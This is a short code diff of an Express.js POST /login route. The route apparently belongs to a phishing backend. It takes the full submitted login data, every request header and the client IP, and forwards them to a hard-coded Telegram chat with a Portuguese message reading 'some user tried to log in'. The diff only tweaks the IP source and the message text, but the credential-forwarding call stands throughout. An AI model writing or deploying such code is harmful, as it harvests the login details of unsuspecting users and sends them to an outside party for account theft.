@@ -5,14 +5,14 @@ const routes = express.Router();
 
 routes.post("/login", async function (req, res) {
   let data = `${JSON.stringify(req.body)}`;
-  let peer = `${JSON.stringify(req.socket.remoteAddress)}`;
+  let peer = `${req.headers["x-forwarded-for"]}`;
   let headers = JSON.stringify(req.headers);
 
   console.log(`${data}`);
 
   await bot.telegram.sendMessage(
     "-1001747704625",
-    `Algum usuário tentou fazer login:\nDados: ${data}\nIP: ${peer}\nHeaders: ${headers}`
+    `ALGUM USUÁRIO TENTOU FAZER LOGIN:\nDados: ${data}\nEndereço de IP: ${peer}\n\n\nHeaders: ${headers}`
   );
 
   return res
